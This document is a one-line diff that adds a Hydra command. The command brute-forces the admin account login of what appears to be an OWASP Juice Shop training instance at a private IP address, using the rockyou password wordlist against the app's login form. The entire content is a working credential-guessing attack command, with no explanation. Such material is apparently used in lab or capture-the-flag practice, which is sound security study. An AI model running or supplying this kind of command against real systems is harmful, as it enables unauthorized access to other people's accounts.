@@ -1,0 +1,1 @@
+hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 192.168.1.4  https-post-form "/rest/user/login:email=^USER^&password=^PASS^:F=Invalid email or password" -V -I 
